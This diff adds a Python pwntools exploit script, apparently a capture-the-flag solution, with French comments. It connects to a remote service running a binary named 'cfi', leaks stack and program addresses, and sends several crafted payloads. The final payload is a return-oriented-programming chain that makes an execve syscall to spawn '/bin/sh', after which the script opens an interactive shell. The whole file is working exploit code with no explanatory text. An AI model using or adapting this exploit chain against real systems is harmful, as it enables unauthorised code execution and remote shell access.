@@ -1,0 +1,49 @@
+from pwn import *
+
+exe = ELF("./cfi")
+io = remote("94.237.61.52", 31545)
+
+# Recevoir le menu 
+io.recvuntil(b"> ")
+
+# Envoyer l'option 1
+io.sendline(b"1")
+
+# Recevoir la réponse 
+try:
+    out = io.recvuntil(b"|  <", timeout=5).decode()
+    ads = re.findall(r'0x[0-9a-fA-F]+', out)
+    if len(ads) >= 2:
+        stack = int(ads[0], 16)
+        exe.address = int(ads[1], 16) - 0x33e3
+
+        pop_rcx = exe.address + 0x29b4
+        rcx_to_rax = exe.address + 0x29db
+        pop_rdi = exe.address + 0x2746
+        pop_rsi = exe.address + 0x2b1a
+        mov_rdx = exe.address + 0x2c50
+        call_addr = exe.address + 0x3542
+        canary = exe.sym['main'] + 0x1d5
+
+        pl1 = p64(0)*5 + p64(canary) + p64(0)*6 + p64(call_addr) + p64(canary) + p64(0)*210
+        pl1 += p64(exe.address+0x7d00) + p64(0)*17 + p64(stack+0x58) + p64(0)*8 + p64(canary)
+
+        pl2 = p64(canary) + p64(exe.sym['vuln']+129) + p64(stack+0x48) + p64(0) + p64(call_addr)
+
+        io.sendlineafter(b"> ", b"5")
+        io.sendlineafter(b"> ", pl1)
+        io.recvuntil(b"> ")
+        io.send(pl2)
+
+        pl3 = p64(pop_rdi) + p64(stack+0x70) + p64(exe.plt.gets)
+        pl3 += p64(pop_rcx) + p64(0x3b) + p64(rcx_to_rax) + p64(0)
+        pl3 += p64(pop_rsi) + p64(0) + p64(pop_rdi) + p64(stack+0xa8)
+        pl3 += p64(mov_rdx) + b"/bin/sh\x00" + p64(0)*2
+
+        io.send(pl3)
+        io.interactive()
+    else:
+        print("Erreur: pas assez d'adresses trouvées")
+except Exception as e:
+    print(f"Erreur: {e}")
+    io.close()
